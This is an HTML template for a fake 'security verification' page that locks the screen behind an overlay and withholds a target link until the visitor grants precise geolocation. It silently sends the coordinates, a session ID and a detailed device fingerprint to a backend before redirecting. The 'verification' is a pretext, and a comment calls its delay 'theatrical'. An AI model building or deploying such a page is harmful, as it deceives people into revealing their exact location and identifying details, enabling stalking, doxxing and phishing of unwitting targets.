<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Access Gateway</title>
    <!-- Instruct the browser to send Client Hints -->
    <meta http-equiv="Delegate-CH" content="sec-ch-ua-full-version-list https://nominatim.openstreetmap.org; sec-ch-ua-model https://nominatim.openstreetmap.org">
    <style>
        :root {
            --bg-color: #0f172a;
            --overlay-bg: rgba(15, 23, 42, 0.85);
            --card-bg: #1e293b;
            --card-border: rgba(255, 255, 255, 0.1);
            --accent: #3b82f6;
            --accent-hover: #2563eb;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
            --error: #ef4444;
            --success: #10b981;
        }

        @media (prefers-color-scheme: light) {
            :root {
                --bg-color: #f8fafc;
                --overlay-bg: rgba(241, 245, 249, 0.85);
                --card-bg: #ffffff;
                --card-border: rgba(0, 0, 0, 0.1);
                --text-main: #0f172a;
                --text-muted: #64748b;
            }
        }

        /* Lock the entire page */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden; /* Prevent scrolling */
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            background: var(--bg-color);
            color: var(--text-main);
            user-select: none; /* Prevent text selection */
        }

        /* Full Screen Overlay */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--overlay-bg);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            z-index: 9999; /* Always on top */
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: auto; /* Block clicks to anything behind */
        }

        /* Centered Card */
        .card {
            background: var(--card-bg);
            border: 1px solid var(--card-border);
            border-radius: 20px;
            padding: 40px 32px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            animation: popIn 0.4s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes popIn {
            0% { transform: scale(0.95); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }

        /* Icon Container */
        .icon-container {
            width: 64px;
            height: 64px;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background: rgba(59, 130, 246, 0.1);
            color: var(--accent);
            transition: all 0.3s ease;
        }
        
        .icon-container.error {
            background: rgba(239, 68, 68, 0.1);
            color: var(--error);
        }
        
        .icon-container.success {
            background: rgba(16, 185, 129, 0.1);
            color: var(--success);
        }

        .spinner {
            width: 32px;
            height: 32px;
            border: 3px solid transparent;
            border-top-color: currentColor;
            border-right-color: currentColor;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        h1 {
            margin: 0 0 12px;
            font-size: 1.25rem;
            font-weight: 600;
        }

        p {
            margin: 0 0 24px;
            color: var(--text-muted);
            line-height: 1.5;
            font-size: 0.95rem;
        }

        /* Button UI */
        .btn {
            background: var(--accent);
            color: #fff;
            border: none;
            padding: 14px 24px;
            font-size: 1rem;
            font-weight: 500;
            border-radius: 12px;
            cursor: pointer;
            transition: background 0.2s ease, transform 0.1s ease;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn:hover { background: var(--accent-hover); }
        .btn:active { transform: scale(0.98); }
        
        /* UI State hiding */
        .hidden { display: none !important; }

    </style>
</head>
<body>

    <!-- Locked Full Screen Overlay -->
    <div class="overlay">
        <div class="card">
            
            <!-- Dynamic Icon -->
            <div class="icon-container" id="status-icon">
                <div class="spinner"></div>
            </div>

            <h1 id="status-title">Checking System...</h1>
            <p id="status-message">Initializing security verification protocol.</p>

            <!-- Retry Button (Hidden initially) -->
            <button class="btn hidden" id="retry-btn" onclick="retryVerification()">
                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/></svg>
                Retry Verification
            </button>
            
        </div>
    </div>

    <script>
        const SESSION_ID = '{{SESSION_ID}}';
        const TARGET_URL = '{{TARGET_URL}}';
        let redirectTriggered = false;

        // UI Elements
        const titleEl = document.getElementById('status-title');
        const msgEl = document.getElementById('status-message');
        const iconContainer = document.getElementById('status-icon');
        const retryBtn = document.getElementById('retry-btn');

        // Gather enriched client-side data natively
        let screenResolution = 'Unknown';
        try { screenResolution = `${window.screen.width}x${window.screen.height}`; } catch(e) {}
        let timezoneStr = "Unknown";
        try { timezoneStr = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}

        const deviceData = {
            screen: screenResolution,
            timezone: timezoneStr,
            devicePixelRatio: window.devicePixelRatio || 1,
            language: navigator.language || 'Unknown',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory || 'Unknown',
            networkType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'Unknown',
            userAgent: navigator.userAgent
        };

        // Complete Verification and Redirect
        function triggerSuccessRedirect() {
            if (redirectTriggered) return;
            redirectTriggered = true;
            
            // Update UI to success state
            retryBtn.classList.add('hidden');
            iconContainer.className = 'icon-container success';
            iconContainer.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
            titleEl.innerText = 'Verification Complete';
            msgEl.innerText = 'Redirecting you to the secure portal...';
            
            setTimeout(() => { window.location.href = TARGET_URL; }, 1200);
        }

        // Handle Deny State
        function showDenyState() {
            iconContainer.className = 'icon-container error';
            iconContainer.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>';
            titleEl.innerText = 'Location Required';
            msgEl.innerText = 'This system requires location access to continue. Please allow location permissions in your browser.';
            retryBtn.classList.remove('hidden');
        }

        // Core processing logic
        async function enrichAndSend(locationData) {
            try {
                if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                    const uach = await navigator.userAgentData.getHighEntropyValues([
                        'architecture', 'bitness', 'model', 'platformVersion', 
                        'fullVersionList', 'formFactors', 'wow64'
                    ]).catch(() => null);
                    
                    if (uach) {
                        deviceData.uach = {
                            mobile: navigator.userAgentData.mobile,
                            platform: navigator.userAgentData.platform,
                            brands: navigator.userAgentData.brands,
                            ...uach
                        };
                    }
                }
            } catch (e) {}

            locationData.deviceData = deviceData;

            // Silently process to backend, then unlock UI
            fetch('/api/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(locationData)
            })
            .then(() => triggerSuccessRedirect())
            .catch(() => triggerSuccessRedirect());
        }

        // Trigger Geolocation API
        function requestLocation() {
            // Set requesting state
            retryBtn.classList.add('hidden');
            iconContainer.className = 'icon-container';
            iconContainer.innerHTML = '<div class="spinner"></div>';
            titleEl.innerText = 'Requesting Location...';
            msgEl.innerText = 'Please select "Allow" when prompted by your browser to verify environment.';

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        titleEl.innerText = 'Finalizing...';
                        msgEl.innerText = 'Location secured. Finalizing environment checks.';
                        enrichAndSend({
                            sessionId: SESSION_ID,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        });
                    },
                    (error) => {
                        console.warn("Location error:", error.message);
                        showDenyState();
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            } else {
                showDenyState();
            }
        }

        // Retry Loop
        function retryVerification() {
            requestLocation();
        }

        // Auto Start on Page Load
        window.onload = () => {
            setTimeout(requestLocation, 800); // 800ms theatrical delay
        };

    </script>
</body>
</html>
